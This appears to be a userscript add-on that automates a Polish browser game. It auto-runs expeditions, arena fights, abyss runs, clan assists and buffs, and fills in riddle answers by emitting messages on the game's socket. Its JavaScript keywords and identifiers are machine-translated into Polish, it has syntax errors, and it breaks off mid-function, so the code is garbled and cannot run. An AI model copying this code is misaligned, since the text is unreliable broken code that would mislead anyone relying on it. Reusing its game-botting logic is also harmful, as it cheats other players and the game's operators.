var sprawdzono = fałsz;

jeśli (typeof GAME === 'niezdefiniowany') { } else {
    niech Pog = setInterval(() => {
        jeśli (!GAME.pid) { } w przeciwnym razie {
            wyczyśćInterwał(Pog);
            zaznaczone = prawda;
        }
    }, 50);

    niech Pgg = setInterval(() => {
        wyczyśćInterwał(Pgg);
        dla (var i w GRZE) {
            jeśli (i.indexOf("socxxx") === 0 && i.lastIndexOf("ket") + 3 === i.length) {
                GRA.socket = GRA[i];
                przerwa;
            }
        }
        klasa kwsv3 {
            konstruktor(menedżer znaków) {
                this.zgłoszono = fałsz;
                this.charactersManager = menedżer znaków;
                this.isLogged((dane) => {
                    Obiekt.defineProperty(GRA, 'pid', {
                        zapisywalny: fałsz
                    });
                    Obiekt.defineProperty(GRA, 'login', {
                        zapisywalny: fałsz
                    });
                });
                this.isCheckingTournaments = false;
                this.tournamentCategory = niezdefiniowana;
                this.newTournamentID = niezdefiniowane;
                this.tourSigned = false;
                this.firstTournamentPageLoaded = false;
                this.settings = this.getSettings();
                to.utwórzCSS();
                to.createMinimapSettings();
                jeśli ($("#top_bar .adv").length) $("#top_bar .adv").remove();
                this.sortClanPlanets();
                this.loadRiddles((dane) => {
                    this.riddles = dane;
                });
                this.addToCSS(`.kom{tło:url(/gfx/layout/tloPilot.png); rozmiar tła:okładka; obraz obramowania:url(/gfx/layout/mapborder.png) 7 8 7 7 wypełnienie; styl obramowania:pełny; szerokość obramowania:7px 8px 7px 7px; cień pola:brak;} .kom .zamknij_kom b{tło:url(/gfx/layout/tloPilot.png);} .exchange_win{maksymalna wysokość:500; wysokość:automatyczna;}`);
                this.addToCSS(`#emp_list .petopt_btns .newBtn{margines:0px 3px 3px 0px;} .newBtn.do_all_instances{kolor:#e5d029;}`);
                this.addToCSS(`#quick_bar{z-index:4;} .qlink.kws_active_icon{nazwa-animacji:kws_active_icon;czas-animacji:1s;liczba-iteracji-animacji:nieskończona;}@keyframes kws_active_icon { 0% { filtr: obrót odcienia(168 stopni); } 50% { filtr: obrót odcienia(40 stopni); } 100% { filtr: obrót odcienia(168 stopni); } } .sideIcons{ szerokość:29px; wysokość:29px; lewa:-37px; rozmiar-tła:contain; } .autoExpeCodes{tło:#12121294; obramowanie:1px solid rgb(87, 87, 114); promień-obramowania:5px 0px 0px 5px; pozycja:bezwzględna; góra:-100px; lewa:-97px; wypełnienie:5px; wyświetlanie:brak; kolor:#ffe500c7; wybór użytkownika:brak;} .manage_autoExpeditions:hover + .autoExpeCodes, .autoExpeCodes:hover{ wyświetlanie:flex; } .autoExpeCodes .newCheckbox{margines: 0 auto; wyświetlanie:blokuj;} `);
                this.addToCSS(`#secondary_char_stats .instance{margines górny:10px; kursor:wskaźnik; szerokość:100px;} #secondary_char_stats .activities{margines górny:-5px; kursor:wskaźnik; szerokość:100px;} #secondary_char_stats ul {margines górny:-18px; margines lewy:-18px;} .ico.a11{background:url("https://raw.githubusercontent.com/KWSforAll/KWSforAll/main/instances.png"); background-repeat: bez powtarzania; background-size: dziedzicz; background-position: center;} .ico.a12{background-image: url(https://raw.githubusercontent.com/KWSforAll/KWSforAll/main/activity.png); background-repeat: brak powtórzeń; rozmiar tła: dziedzicz; pozycja tła: środek;}`);
                to.dodajDoCSS(`.ssj_uio{tło:url("https://i.imgur.com/EcfEUcG.png");}`);
                this.addToCSS(`#quick_allTransformations { pozycja:bezwzględna; góra:33px; indeks z:1; tło:rgb(0 0 0 / 59%); wyświetlanie:brak; kierunek elastyczny: odwrócenie kolumny; wypełnienie:5px 5px 0px 5px; promień obramowania:5px; cień pola:0px 0px 5px 0px rgb(32 96 185);} .show_qat:hover + #quick_allTransformations, #quick_allTransformations:hover { wyświetlanie:flex; } #quick_allTransformations .option { wyświetlanie:blok; margines:0px 0px 5px 0px; }`);
                this.addToCSS(`#player_list_con .glory_rank.war{animacja:brak !ważne;kolor tła:rgb(22 83 106);cień pola:0px 0px 7px 0px rgb(0 253 255);} .player_clan.enemy img{animacja:brak !ważne;cień pola:0px 0px 10px 1px rgb(0 253 255);}`);
                this.addToCSS(`.better_chat_loading{filtr:sepia(1) obrót odcienia(270 stopni);} .better_chat_loading:hover{filtr:sepia(1) obrót odcienia(90 stopni);} .chat_icon.load:hover{tło:url(/gfx/layout/ikonyChat.png) -90px 0px !ważne;}`);
                this.addToCSS(`#upg_menu button[data-page="game_buffs"]{display:block !important;}`);
                this.addToCSS(`.qtrack{szerokość:400px;} #drag_con.scroll .qtrack{szerokość:383px;} #quest_track_con #drag_tracker{wybór użytkownika:brak;} #quest_track_con .sep2{wysokość:14px;} #quest_track_con .sep3{wysokość:14px;}`);
                this.addToCSS(`.option.ls.spawner{ pozycja:bezwzględna; góra:60px; prawa:40px; rozmiar tła: 100% 100%; obramowanie: pełne #6f6f6f 1px; }`);
                this.addToCSS(`#kws_minimap_settings{ margin:10px 0px 0px 0px; border-top:solid white 1px; padding-top:10px; } #field_sett #field_options{ height:407px; } #minimap_con{ ${this.minimap.side == 1 ? `lewy: -4px; prawy: nieustawione;` : this.minimap.side == 2 ? `lewy: -210px; prawy: nieustawione;` : ""} krycie: ${this.minimap.opacity / 100} } #minimap_range{ width:150px; display:inline-block; vertical-align:middle;} .smin_butt{background: #31313a69 !ważne; border: solid #ffffff4d 1px !ważne; width:auto !ważne; wysokość:32px !ważne; wysokość linii: 30px; wyświetlanie: blok liniowy; wyrównanie tekstu: środek; rodzina czcionek: 'Odtwórz', bezszeryfowa; rozmiar czcionki: 13px; grubość czcionki: pogrubiona; kolor: #fff; dekoracja tekstu: brak; przekształcenie tekstu: wielkie litery; obramowanie: brak; wypełnienie: 0 10px; promień obramowania: 5px; kursor: wskaźnik; cień tekstu: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000; margines górny:2px; liczba zmiennoprzecinkowa:brak !ważne;} .smin_input{tło: #040e13; wysokość: 31px; obramowanie: pełne #ffffff4d 1px !ważne; wyświetlanie: blok liniowy; wyrównanie tekstu: środek; rozmiar czcionki: 13px; kolor: #305779; rodzina czcionek: 'Odtwórz', bezszeryfowa; wyrównanie w pionie: do środka; promień obramowania: 5px;}`);
                this.addToCSS(`#kws_locInfo{background:url("/gfx/layout/tloPilot.png");pozycja: bezwzględna;góra: 220px;indeks Z: 2;szerokość: 204px;wypełnienie: 5px;promień obramowania: 5px;obraz obramowania: url(/gfx/layout/mapborder.png) 7 8 7 7 wypełnienie;styl obramowania: pełny;szerokość obramowania: 7px 8px 7px 7px; wyświetlanie:${this.minimap.loc_info == 0 ? `brak` : `blok`}} #kws_locInfo .sekcja{pozycja: bezwzględna;góra:-20px;lewa:0px;background:url("https://i.imgur.com/Mi3kUpg.png");rozmiar-tło:100% 100%;szerokość:190px;}`);
                this.addToCSS(`.kws_top_bar{float:left !important; position: absolute; z-index: -1;} .kws_top_bar_section{color:white;padding:3px 5px 3px 5px;border-radius:5px;margin-right:8px;user-select:none;}`);
                this.addToCSS(`.go_to_emp_con{ pozycja:bezwzględna; góra:33px; indeks z:1; tło:rgb(0 0 0 / 59%); wyświetlanie:brak; kierunek flex: odwrócenie kolumny; wypełnienie:5px 5px 0px 5px; promień obramowania:5px; cień pola:0px 0px 5px 0px rgb(32 96 185);} .empPos:hover + .go_to_emp_con, .go_to_emp_con:hover { wyświetlanie:flex; } .go_to_emp_con .qlink { wyświetlanie:blok; margines:0px 0px 5px 0px; }`);
                this.addToCSS(`#ekw_sets_buy button, div[data-option="change_ekw_set"]{height:20px !ważne; line-height:19px !ważne; margin-top:9px !ważne;}`);
                this.addToCSS(`#page_game_camp .ekw_slot.mniejszy obraz { szerokość: 64px; } #page_game_camp div[data-item_id="1923"].mniejszy obraz { szerokość: 32px; pozycja: bezwzględna; margines górny: -64px; margines lewy: 34px; }`);
                this.addToCSS(`#kws_spawn{ tło: rgba(0,0,0,0.9); pozycja: stała; góra: 120px; lewa: 5px; indeks z: 9999; szerokość: 200px; wypełnienie: 1px; promień obramowania: 5px; styl obramowania: solid; szerokość obramowania: 7px 8px 7px 7px; wyświetlanie: blok; wybór użytkownika: brak; kolor: #333333; } #kws_spawn .sekcja { pozycja: absolutna; góra: -27px; lewa: -7px; tło: rgba(0,0,0,0.9); filtr: odcień-obrót(150stopni); rozmiar tła: 100% 100%; szerokość: 200px; kursor: przewijanie do końca; } #kws_spawn .spawn_row{obramowanie-dół: solid szary 1px; kolor: biały; rozmiar czcionki: 13px; wyświetlacz: flex; wypełnienie: 4px;}`);
                $("#map_canvas_container").append(`<div id="kws_spawn"> <div class="sekcja"><img src="/gfx/layout/war.png" class="spawn_switch">USTAWIENIA SPAWNU</div><div id="kws_spawn2" style="">${this.spawnList()</div>`);
                this.addToCSS(`.spawn_switch{kursor:wskaźnik;}`);
                this.addToCSS(`.quest_roll1{pozycja:bezwzględna; szerokość:50px; wysokość:50px; tło:url('/gfx/layout/dice.png') 0 0; góra:-25px; lewa:25px; kursor:wskaźnik; filtr:cień(0px 0px 10px limonkowy)} .quest_roll2{pozycja:bezwzględna; szerokość:50px; wysokość:50px; tło:url('/gfx/layout/dice.png') 0 0; góra:-25px; lewa:75px; kursor:wskaźnik; filtr:cień(0px 0px 10px #00fdff)} .quest_roll3{pozycja:bezwzględna; szerokość:50px; wysokość:50px; tło:url('/gfx/layout/dice.png') 0 0; góra:-25px; lewy: 125px; kursor: wskaźnik; filtr: cień rzucony (0px 0px 10px #ff0000)} .quest_roll: hover{tło: url('/gfx/layout/dice.png') 0 -45px;} .quest_roll1: hover{tło: url('/gfx/layout/dice.png') 0 -45px;} .quest_roll2: hover{tło: url('/gfx/layout/dice.png') 0 -45px;} .quest_roll3: hover{tło: url('/gfx/layout/dice.png') 0 -45px;}`);
                this.addToCSS(`#lastmap_bar { góra: 115px !ważne; }`);
                this.addToCSS(`button#changeProfileNext { pozycja: bezwzględna; góra: 85px; prawa: 16px; tło: gradient liniowy(0deg, rgba(252,238,54,1) 0%, rgba(247,121,12,1) 100%); obramowanie: 2px solid #973804; promień obramowania: 5px; szerokość: 52px; }`);
                this.addToCSS(`button#changeProfileNext:hover {
                    tło: gradient liniowy(0 stopni, rgba(247,121,12,1) 0%, rgba(252,238,54,1) 100%);
                    obramowanie: 0px pełne #973804;
                }`);
                this.addToCSS(`button#changeProfilePrev { pozycja: bezwzględna; góra: 85px; prawa: 75px; tło: gradient liniowy(0deg, rgba(252,238,54,1) 0%, rgba(247,121,12,1) 100%); obramowanie: 2px stałe #973804; promień obramowania: 5px; szerokość: 52px; }`);
                this.addToCSS(`button#changeProfilePrev:hover {
                    tło: gradient liniowy(0 stopni, rgba(247,121,12,1) 0%, rgba(252,238,54,1) 100%);
                    obramowanie: 0px pełne #973804;
                }`);
                this.addToCSS(`.kws_additional_top_bar{float:left !important; position: absolute; z-index: -1; display: none} .kws_additional_top_bar_section{color:white;padding:3px 5px 3px 5px;border-radius:5px;margin-right:8px;user-select:none;}`);
                $("#top_bar").append(`<div class="kws_top_bar"></div>`);
                $("#top_bar").append(`<div class="kws_additional_top_bar"></div>`);
                $("#bless_type_2").click();
                $(`.channel_opts .option.chat_icon.load`).addClass('better_chat_loading').removeAttr('id').removeAttr('data-option');
                $("#clan_inner_planets h3").eq(0).append(`<button id="poka_telep" style="margin-left:5px;" class="newBtn">pokaź / ukryj salę telep</button> `);
                $(`<button class="newBtn free_assist_for_all" style="margin-right:5px;">Asystuj wszystkim za darmo</button>`).insertBefore(`button[data-option="clan_assist_all"]`);
                $("#clan_inner_wars h3").eq(0).append(` <button class="newBtn activate_all_clan_buffs">Aktywuj wszystkie buffy</button>`);
                $(`#minimap_con`).append(`<div id="kws_locInfo"><div class="sekcja">INFORMACJE O LOKACJI</div><div class="content"></div></div> `);
                $("#sett_page_local div").eq(0).prepend(`<b class="green">Zmień tło strony </b><div class="game_input"><input id="new_website_bg" style="width:370px;" type="text"></div><button class="option newBtn kws_change_website_bg" style="margin-left:5px;">Zmień</button><button class="option newBtn kws_reset_website_bg" style="margin-left:5px;">Resetuj</button><br><br>`);
                $('.MoveIcon[data-option="mob_spawner_go"]').after('<div class="MoveIcon bigg option" data-option="map_multi_pvp" data-toggle="tooltip" data-original-title="<div class=tt>Multiwalka PvP<br />Klawisz skrótu:<b class=orange>B</b></div>"><img src="https://i.imgur.com/QPQBcFp.png"></div>');
                $('.MoveIcon[data-option="map_multi_pvp"]').after('<div class="MoveIcon bigg Option" data-option="map_quest_skip" data-toggle="tooltip" data-original-title=" <div class=tt>Opcja Dalej w otwartym zadaniu jeśli jest jedna. Atakuje bosy w zadaniach i zamyka raport z walki opcję na zabicie mobków. W zadaniu subki wybiera opcję za 100k Zbiera zasób na którym stoimy.<br />Klawisz skrótu:<b class=orange>X</b></div>"><img src="https://i.imgur.com/wuK91VF.png"></div>');
                $('.MoveIcon[data-option="map_quest_skip"]').after('<div class="MoveIcon bigg option" data-option="map_quest_skip_time" data-toggle="tooltip" data-original-title="<div class=tt>Używanie zegarków w zadaniach<br />Klawisz skrótu:<b class=orange>N</b></div>"><img src="https://i.imgur.com/9YCvJKe.png"></div>');
                $('.MoveIcon[data-option="map_quest_skip_time"]').after('<div class="MoveIcon bigg option" data-option="map_alternative_pilot" data-toggle="tooltip" data-original-title="<div class=tt>Ukryj pilota, widzÄ™ innÄ… klawiaturÄ™<br />Klawisz skrĂłtu:<b class=orange>=</b></div>"><img src="https://up.be3.ovh/upload/1709400449.png"></div>');
                $("#changeProfile").before('<button id="changeProfilePrev" class="btn_small_gold" data-option="prevChar">Poprzedni</button>');
                $("#changeProfile").after('<button id="changeProfileNext" class="btn_small_gold" data-option="nextChar">Dalej</button>');
                this.auto_abyss_interval = fałsz;
                this.auto_arena = false;
                this.additionalTopBarVisible = false;
                this.baselinePower = niezdefiniowane;
                this.baselineLevel = niezdefiniowany;
                ustawInterwał(() => {
                    jeśli ('char_data' w GRZE) {
                        this.updateTopBar();
                    }
                }, 1000);
                this.setWebsiteBackground();
                to.bindClickHandlers();
                GRA.socket.on('gr', (res) => {
                    this.handleSockets(res);
                });
            }
            jestZalogowany(cb) {
                niech waitForID = setInterval(() => {
                    jeśli (GRA.pid) {
                        clearInterval(czekaj na ID);
                        cb(GRA.pid);
                    }
                }, 200);
            }
            załadujZagadki(cb) {
                pobierz(`https://raw.githubusercontent.com/KWSforAll/KWSforAll/main/riddles.json`).then(res => res.json()).then((out) => {
                    cb(poza)
                }).catch(err => {
                    rzucić błąd
                });
            }
            rozwiążZagadkę(r_id) {
                niech zagadka = this.riddles.find((r) => r.id == r_id);
                jeśli (zagadka) {
                    $("input[id=quest_riddle]").val(riddle.answer);
                }
            }
            pobierzUstawienia() {
                niech ustawienia = JSON.parse(localStorage.getItem("kws_settings"));
                niech ustawienia_przykładowe = {
                    hide_tracker: fałsz,
                    aeCodes: fałsz
                };
                jeśli (ustawienia) {
                    dla (klucz const obiektu Object.keys(settings_sample)) {
                        jeśli (ustawienia[klucz] === niezdefiniowane) {
                            ustawienia[klucz] = przykład_ustawień[klucz];
                        }
                    }
                    localStorage.setItem("kws_settings", JSON.stringify(ustawienia));
                    ustawienia powrotu;
                } w przeciwnym razie {
                    localStorage.setItem("kws_settings", JSON.stringify(settings_sample));
                    zwróć settings_sample;
                }
            }
            zaktualizujUstawienia() {
                localStorage.setItem('kws_settings', JSON.stringify(this.settings));
            }
            idźPozycjaEmpPos() {
                niech imp_pos = $(".empPos").position();
                $(".go_to_emp_con").css("lewy", imp_pos.lewy - 5);
            }
            listaQts() {
                niech trans = this.parseSSJqts(GAME.char_data.race);
                niech html = ``;
                dla (let i = 0; i < trans.length && trans[i][0] !== GAME.quick_opts.ssj[0]; i++) {
                    html += `<div class="opcja qlink ${trans[i][1]}" data-option="use_transform" data-tech="${trans[i][0]}"></div>`;
                }
                jeśli ($(".show_qat").length) {
                    niech ssj_pos = $(".show_qat").position();
                    $("#quick_allTransformations").css("lewy", ssj_pos.lewy - 5);
                }
                $("#szybkie_wszystkieTransformacje").html(html);
                opcja_bind();
            }
            parseSSJqts(rasa) {
                przełącznik (wyścig) {
                    przypadek 0:
                        powrót [
                            [19, "ssj1"],
                            [25, „ssj2”],
                            [26, „ssj3”],
                            [30, „ssj4”],
                            [39, "ssj5"],
                            [72, "ssja"],
                            [81, "ssjb"],
                            [116, "ssj_uio"]
                        ];
                    przypadek 1:
                        powrót [
                            [46, "ssj1"],
                            [50, „ssj2”],
                            [53, „ssj3”],
                            [55, „ssj4”],
                            [39, "ssj5"],
                            [72, "ssja"],
                            [81, "ssjb"],
                            [116, "ssj_uio"]
                        ];
                    przypadek 2:
                        powrót [
                            [63, „ssj1”],
                            [64, „ssj2”],
                            [66, "ssjm"],
                            [39, "ssj5"],
                            [72, "ssja"],
                            [81, "ssjb"],
                            [116, "ssj_uio"]
                        ];
                    przypadek 3:
                        powrót [
                            [78, "ssj1"],
                            [76, "ssj2"],
                            [79, „ssj3”],
                            [39, "ssj5"],
                            [72, "ssja"],
                            [81, "ssjb"],
                            [116, "ssj_uio"]
                        ];
                    przypadek 4:
                        powrót [
                            [92, "ssj1"],
                            [93, „ssj2”],
                            [99, "ssj3"],
                            [100, "ssj4"],
                            [39, "ssj5"],
                            [72, "ssja"],
                            [81, "ssjb"],
                            [116, "ssj_uio"]
                        ];
                    przypadek 5:
                        powrót [
                            [101, "ssj1"],
                            [102, "ssj2"],
                            [103, „ssj3”],
                            [110, „ssj4”],
                            [39, "ssj5"],
                            [72, "ssja"],
                            [81, "ssjb"],
                            [116, "ssj_uio"]
                        ];
                    przypadek 6:
                        powrót [
                            [121, "ssj1"],
                            [122, "ssj2"],
                            [123, "ssj3"],
                            [124, "ssj4"],
                            [39, "ssj5"],
                            [72, "ssja"],
                            [81, "ssjb"],
                            [116, "ssj_uio"]
                        ];
                    przypadek 7:
                        powrót [
                            [127, "ssj1"],
                            [128, "ssj2"],
                            [129, "ssj3"],
                            [132, „ssj4”],
                            [39, "ssj5"],
                            [72, "ssja"],
                            [81, "ssjb"],
                            [116, "ssj_uio"]
                        ];
                    domyślny:
                        powrót [];
                }
            }
            zarządzajAutoExpeditions() {
                niech expedNmbr = GAME.char_data.bonus16 < GAME.getTime() ? 1 : 2;
                jeśli (!this.autoExpeditions) {
                    this.autoExpeditions = prawda;
                    this.autoExpeditionsInterval = setInterval(() => {
                        niech przeciwnicy = $("#arena_players").find(`.player button[data-option="arena_attack"][data-quick="1"]:not(.initial_hide_forced)`);
                        niech przeciwnik = parseInt(opponents.attr("data-index"));
                        ustawCzasOkres(() => {
                            GRA.parseTimed();
                        }, 100);
                        jeśli (this.settings.aeCodes && $("#train_uptime").find('.timer').length == 0 && !GAME.is_training && $("#timed_label").text().includes("Wyprawa") && GAME.char_tables.timed_actions[0] != niezdefiniowane) {
                            GRA.socket.emit('ga', {
                                a: 8,
                                typ: 3
                            });
                        } else if (this.settings.aeCodes && $("#train_uptime").find('.timer').length == 0 && !GAME.is_training) {
                            GRA.socket.emit('ga', {
                                a: 8,
                                typ: 2,
                                statystyka: 1,
                                Czas trwania: 1
                            });
                            ustawCzasOkres(() => {
                                GRA.socket.emit('ga', {
                                    a: 8,
                                    typ: 5,
                                    apud: 'vzaaa'
                                });
                            }, 1500);
                        } else if (this.settings.aeCodes && GAME.is_training && $("#train_uptime").find('.timer').length == 1) {
                            GRA.socket.emit('ga', {
                                a: 8,
                                typ: 3
                            });
                        } else if (this.auto_arena && !isNaN(opponent)) { } else if (GAME.char_tables.timed_actions[0] == niezdefiniowane || GAME.char_tables.timed_actions[1] == niezdefiniowane && GAME.char_data.bonus16 > GAME.getTime()) {
                            GRA.socket.emit('ga', {
                                a: 10,
                                typ: 2,
                                ilość sztuk: 0
                            });
                            kom_clear();
                        } w przeciwnym razie { }
                    }, 4000);
                    $(".qlink.manage_autoExpeditions").addClass("kws_active_icon");
                } w przeciwnym razie {
                    this.autoExpeditions = fałsz;
                    clearInterval(this.autoExpeditionsInterval);
                    $(".qlink.manage_autoExpeditions").removeClass("kws_active_icon");
                }
            }
            zarządzajAutoAbyss() {
                GRA.socket.emit('ga', {
                    a: 59,
                    typ: 0
                });
                ustawCzasOkres(() => {
                    jeśli (GAME.quick_opts.ssj && $("#ssj_bar").css("display") == "brak") {
                        GRA.socket.emit('ga', {
                            a: 18,
                            typ: 5,
                            tech_id: GAME.quick_opts.ssj[0]
                        });
                    } w przeciwnym razie jeśli ($('#ssj_status').text() == "--:--:--") {
                        GRA.socket.emit('ga', {
                            a: 18,
                            typ: 6
                        });
                    }
                }, 1000);
                jeśli ($("#ss_cd_still").css("display") == "brak") {
                    ustawCzasOkres(() => {
                        GRA.socket.emit('ga', {
                            a: 59,
                            typ: 1
                        });
                    }, 1000);
                    ustawCzasOkres(() => {
                        $('#fight_view').fadeOut();
                    (2000);
                    ustawCzasOkres(() => {
                        jeśli ((GRA.char_data.reborn == 4 || GRA.char_data.reborn == 5) && GRA.char_data.alt_transform_expiry < GRA.getTime()) {
                            GRA.socket.emit('ga', {
                                a: 18,
                                typ: 8,
                                identyfikator techniczny: 134
                            });
                        }
                    }, 3000);
                }
            }
            zarządzajAutoAreną() {
                jeśli (this.auto_arena) {
                    GRA.socket.emit('ga', {
                        a: 46,
                        typ: 0
                    });
                    ustawCzasOkres(() => {
                        this.attackAutoArena();
                    }, 1000);
                } w przeciwnym razie {
                    this.stopAutoArena();
                }
            }
            atakAutoArena() {
                niech przeciwnicy = $("#arena_players").find(`.player button[data-option="arena_attack"][data-quick="1"]:not(.initial_hide_forced)`);
                niech przeciwnik = parseInt(opponents.attr("data-index"));
                jeśli (this.auto_arena) {
                    jeśli (długość przeciwników > 0 i czas gry == 0) {
                        GRA.socket.emit('ga', {
                            a: 46,
                            typ: 1,
                            indeks: przeciwnik,
                            szybko: 1
                        });
                        ustawCzasOkres(() => {
                            this.attackAutoArena();
                        }, 500);
                    } w przeciwnym razie {
                        ustawCzasOkres(() => {
                            this.manageAutoArena();
                        }, 5000);
                    }
                } w przeciwnym razie {
                    this.stopAutoArena();
                }
            }
            zatrzymajAutoArena() {
                this.auto_arena = false;
                $(".qlink.manage_auto_arena").removeClass("kws_active_icon");
            }
            freeAssist() {
                niech fafa_el = $(`button[data-option="clan_assist"]:visible`);
                jeśli (fafa_el.length > 0) {
                    niech fafa_tid = parseInt(fafa_el.eq(0).attr("data-tid"));
                    niech fafa_target = parseInt(fafa_el.eq(0).attr("cel danych"));
                    GRA.socket.emit('ga', {
                        a: 39,
                        typ: 55,
                        czas: fafa_tid,
                        cel: fafa_target
                    });
                    fafa_el.eq(0).ukryj();
                    ustawCzasOkres(() => {
                        this.freeAssist();
                    ( 2100);
                } w przeciwnym razie {
                    GRA.socket.emit('ga', {
                        a: 39,
                        typ: 54
                    });
                    GAME.komunikat("Asystowano wszystkich!");
                }
            }
            aktywujWszystkieBuffyKlanu() {
                niech abut = $("#clan_buffs").find(`button[data-option="activate_war_buff"]`);
                niech isDisabled = $("#clan_buffs").find(`button[data-option="activate_war_buff"]`).parents("tr").hasClass("disabled");
                niech cpbt = $("#clan_planet_buffs").html();
                niech acpbut = $("#has_clan_planet").find(`button[data-option="activate_prp_buff"]`);
                jeśli (abut.length && !isDisabled) {
                    GRA.socket.emit('ga', {
                        a: 39,
                        typ: 26
                    });
                    ustawCzasOkres(() => {
                        this.activateAllClanBuffs();
                    }, 200);
                } w przeciwnym razie jeśli (cpbt == 0) {
                    GRA.socket.emit('ga', {
                        a: 39,
                        typ: 28
                    });
                    ustawCzasOkres(() => {
                        this.activateAllClanBuffs();
                    }, 200);
                } w przeciwnym razie jeśli (acpbut.length && $("#clan_planet_buffs .red").eq(0).text() == 0) {
                    GRA.socket.emit('ga', {
                        a: 39,
                        typ: 29
                    });
                    ustawCzasOkres(() => {
                        this.activateAllClanBuffs();
                    }, 200);
                } w przeciwnym razie {
                    GAME.komunikat("Wszystkie buffy zostały aktywowane!");
                }
            }
            znajdźPracownika(pracownik, cb) {
                niech waitForWorker = setInterval(() => {
                    niech el = $(`button[data-emp="${worker.id}"]button[data-option="emp_job"]`);
                    niech emp_local = parseInt(el.attr("data-emp_local"));
                    jeśli (el.length) {
                        this.workers_info[emp_local] = pracownik;
                        clearInterval(czekajNaPracownika);
                        cb(el);
                    }
                }, 100);
            }
            doAllInstances(pracownik, strona2 = fałsz) {
                niech worker_info = this.workers_info[worker.local];
                niech numer_instancji = this.instanceNumber();
                niech kom = $(".kom").text();
                jeśli (numer_instancji) {
                    if (kom.includes("magicznych esencji") || kom.includes("Magicznych Esencji")) { } else if (worker_info.energy > 0) {
                        GRA.socket.emit('ga', {
                            a: 44,
                            typ: 8,
                            emp: pracownik.id,
                            inst: numer_instancji
                        });
                        ustawCzasOkres(() => {
                            this.doAllInstances(pracownik)
                        }, 250);
                    } w przeciwnym razie jeśli (worker_info.energy == 0) {
                        GRA.socket.emit('ga', {
                            a: 44,
                            typ: 9,
                            emp: worker_info.id
                        });
                        ustawCzasOkres(() => {
                            this.doAllInstances(pracownik)
                        }, 250);
                    }
                } w przeciwnym razie {
                    GAME.komunikat("Wszystkie instancje zostały wykonane!");
                }
            }
            numer_instancji() {
                jeśli (GAME.char_data.icd_1 < 2) {
                    zwróć 1;
                } w przeciwnym razie jeśli (GAME.char_data.icd_2 < 2) {
                    powrót 2;
                } w przeciwnym razie jeśli (GAME.char_data.icd_3 < 2) {
                    zwróć 3;
                } w przeciwnym razie jeśli (GAME.char_data.icd_4 < 2) {
                    powrót 4;
                } w przeciwnym razie jeśli (GAME.char_data.icd_5 < 2) {
                    zwróć 5;
                } w przeciwnym razie jeśli (GAME.char_data.icd_6 < 2) {
                    powrót 6;
                } w przeciwnym razie {
                    zwróć fałsz;
                }
            }
            utwórzUstawieniaMinimapy() {
                this.manageMinimapSettings("ładuj");
                this.manageMapSize("ładowanie");
                this.managePilot();
                $("#field_sett #field_options").append(`<br style='clear:both;'><div id="kws_minimap_settings"> <b class='orange'>Ukryj pilota kontroli postaci: </b><div class="select_input"><select id="kws_hidePilot"><option value="1" ${this.hidePilot == 1 ? "selected" : ""}>tak</option><option value="0" ${this.hidePilot == 0 ? "selected" : ""}>Nie</option></select></div> <b class='orange'>Minimapa wyświetlana na stronie: </b><div class="select_input"><select id="minimap_side"><option value="0" ${this.minimap.side == 0 ? "selected" : ""}>Prawej</option><option value="1" ${this.minimap.side == 1 ? "selected" : ""}>Lewej</option><option value="2" ${this.minimap.side == 2 ? "selected" : ""}>L - Poza</option></select></div> <b class='orange'>Prześroczystość minimapy: </b><input id="minimap_range" type="range" value="${this.minimap.opacity}" min="10" max="100" step="1"> <b class='orange'>Dodatkowe informacje o lokalizacji: </b><div class="select_input"><select id="kws_sh_locInfo"><option value="1" ${this.minimap.loc_info == 1 ? "selected" : ""}>Pokaź</option><option value="0" ${this.minimap.loc_info == 0 ? "selected" : ""}>Ukryj</option></select></div> <b class='orange'>Rozmiar mapy: </b>X: <input name="kws_map_width" class="smin_input" style="width:30px;" type="text" value="${this.mapsize.x}" placeholder="13"> Y: <input name="kws_map_height" class="smin_input" style="width:30px;" type="text" value="${this.mapsize.y}" placeholder="13"><button class="smin_butt kws_mapsize_change" style="margin-left:5px;">Zmień</button><button class="smin_butt kws_mapsize_reset" style="margin-left:5px;">Resetuj</button> </div>`);
            }
            zarządzajUstawieniaminimapy(act) {
                jeśli (act == "load") {
                    this.minimap = JSON.parse(localStorage.getItem('kws_minimap'));
                    jeśli (this.minimap == niezdefiniowane) {
                        ta.minimapa = {
                            strona: 0,
                            krycie: 100,
                            Informacje o lokalizacji: 0
                        };
                        localStorage.setItem('kws_minimap', JSON.stringify(this.minimap));
                    }
                } else if (act == "zapisz") {
                    localStorage.setItem('kws_minimap', JSON.stringify(this.minimap));
                }
            }
            parseMapInfo(zadania, gdzie) {
                niech mapInfo = Object.values(quests).filter(this.filterQuests);
                niech mapSK = Object.keys(GAME.map_balls) ? Object.keys(GAME.map_balls).length : 0;
                $(`#kws_locInfo .content`).html(`Zadania: ${mapInfo.length}<br>SK: ${mapSK}`);
            }
            filtrujQuesty(quest) {
                niech kroki = quest.length;
                jeśli (kroki > 0 i zadanie[kroki - 1] i zadanie[kroki - 1].koniec != 1) {
                    zadanie powrotne;
                }
            }
            ustawTłoStronyWebsite() {
                if (localStorage.getItem('kws_wbg')) {
                    $("ciało").css({
                        „tło”: „#02070D”,
                        „obraz tła”: `url(${localStorage.getItem('kws_wbg')})`,
                        "background-size": "okładka",
                        „background-attachment”: „stały”
                    });
                    $("#new_website_bg").val(localStorage.getItem('kws_wbg'));
                    $("footer").addClass("hide_before");
                }
            }
            zarządzajTłemStronyWebsite(act, url) {
                jeśli (akt == "ustaw") {
                    jeśli (długość adresu url > 5) {
                        localStorage.setItem('kws_wbg', url);
                        $("ciało").css({
                            „tło”: „#02070D”,
                            „obraz tła”: `url(${url})`,
                            "background-size": "okładka",
                            „background-attachment”: „stały”
                        });
                        $("footer").addClass("hide_before");
                    }
                } else if (act == "reset") {
                    localStorage.removeItem("kws_wbg");
                    $("#nowa_strona_internetowa_bg").val("");
                    $("ciało").css({
                        „tło”: „#02070D”,
                        „obraz tła”: `url(/gfx/layout/bg.jpg)`,
                        "background-size": "okładka",
                        „background-attachment”: „stały”
                    });
                    $("footer").removeClass("hide_before");
                }
            }
            zmieńRozmiarMapy(rx = 13, ry = 13) {
                rx = Math.floor(rx);
                ry = Math.floor(ry);
                GRA.mapa.cX = rx * 40;
                GRA.mapa.cY = ry * 40;
                GRA.mapa.rX = rx;
                GRA.mapa.rY = ry;
                jeśli (GAME.map.initiated) {
                    GRA.loadMapJson(funkcja () {
                        GRA.socket.emit('ga', {
                            a: 3,
                            głos: GAME.map_options.vo
                        }, 1);
                    });
                }
                jeśli (rx > 13) {
